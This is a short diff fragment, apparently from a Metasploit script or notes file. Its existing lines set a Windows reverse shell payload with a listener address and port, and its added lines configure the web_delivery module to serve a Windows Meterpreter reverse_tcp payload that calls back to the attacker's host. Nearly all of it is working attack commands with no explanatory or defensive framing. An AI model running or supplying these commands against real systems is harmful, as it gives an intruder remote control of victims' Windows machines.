@@ -38,3 +38,13 @@ set payload windows/shell/reverse_tcp
 set LHOST 10.10.10.10
 set LPORT 4444
 exploit -j -z
+
+# Get meterpreter
+use exploit/multi/script/web_delivery
+set payload windows/meterpreter/reverse_tcp
+set target 2
+set LHOST eth0
+run
+
+
+
